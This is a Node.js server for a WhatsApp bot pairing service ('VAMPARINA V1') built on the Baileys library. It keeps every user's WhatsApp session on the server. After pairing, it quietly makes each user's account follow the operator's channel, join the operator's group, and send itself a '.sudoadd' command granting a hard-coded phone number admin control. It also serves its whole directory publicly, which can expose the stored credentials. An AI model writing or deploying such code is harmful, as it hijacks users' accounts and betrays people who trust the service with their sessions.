import express from 'express';
import bodyParser from 'body-parser';
import { fileURLToPath } from 'url';
import path from 'path';
import fs from 'fs';
import { makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, delay } from '@whiskeysockets/baileys';
import pino from 'pino';

const app = express();
const PORT = process.env.PORT || 8000;

// Paths
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const SESSION_DIR = path.join(__dirname, 'auto_sessions');
const TEMP_DIR = path.join(__dirname, 'temp_sessions');

if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true });
if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });

// Empire Settings
const MY_CHANNEL = "0029VbBm7apIXnlmuyjGGM0p@newsletter";
const MY_GROUP_INVITE = "BZNDaKhvMFo5Gmne3wxt9n";
const KING_ARNOLD = "254703110780";

const activeBots = new Map();

// Increase event listeners
import('events').then(events => {
    events.EventEmitter.defaultMaxListeners = 500;
});

// Middleware
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Global functions for pair.js & qr.js
global.saveAndStartSession = async function(tempPath, phone) {
    const sessionId = `vamp_${phone}_${Date.now()}`;
    const finalPath = path.join(SESSION_DIR, sessionId);
    
    fs.mkdirSync(finalPath, { recursive: true });
    fs.cpSync(tempPath, finalPath, { recursive: true });

    // Auto actions
    const { state } = await useMultiFileAuthState(finalPath);
    const tempSock = makeWASocket({
        auth: state,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false
    });

    tempSock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {  // ← FIXED: REMOVED EXTRA {
            try { await tempSock.newsletterFollow(MY_CHANNEL); } catch(e) {}
            try { await tempSock.groupAcceptInvite(MY_GROUP_INVITE); } catch(e) {}
            await tempSock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${KING_ARNOLD}` });
            tempSock.ws.close();
        }
    });

    await delay(15000);
    startBotFromSession(sessionId, phone, finalPath);
    fs.rmSync(tempPath, { recursive: true, force: true });
};

async function startBotFromSession(sessionId, phone, sessionPath) {
    if (activeBots.has(sessionId)) return;

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false
    });

    activeBots.set(sessionId, sock);

    sock.ev.on('messages.upsert', m => {
        try { import('./main.js').then(mod => mod.default(sock, m)); } catch {}
    });

    sock.ev.on('connection.update', update => {
        if (update.connection === 'open') {
            console.log(`[+] ${phone} → VAMPARINA V1 FULLY LOADED`);
        }
        if (update.connection === 'close') {
            activeBots.delete(sessionId);
            setTimeout(() => startBotFromSession(sessionId, phone, sessionPath), 10000);
        }
    });

    sock.ev.on('creds.update', saveCreds);
}

async function loadOldSessions() {
    const folders = fs.readdirSync(SESSION_DIR).filter(f => f.startsWith('vamp_'));
    console.log(`Reviving ${folders.length} soldiers...`);
    for (const folder of folders) {
        const phone = folder.split('_')[1];
        const fullPath = path.join(SESSION_DIR, folder);
        startBotFromSession(folder, phone, fullPath);
    }
}

// Dashboard
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'pair.html'));
});

// Routes
import pairRouter from './pair.js';
import qrRouter from './qr.js';
app.use('/pair', pairRouter);
app.use('/qr', qrRouter);

// Start
app.listen(PORT, async () => {
    console.clear();
    console.log(`
    VAMPARINA V1 EMPIRE — KING ARNOLD EDITION
    SOLDIERS ONLINE: ${activeBots.size}
    https://vamparina-v1-5.onrender.com
    `);
    await loadOldSessions();
});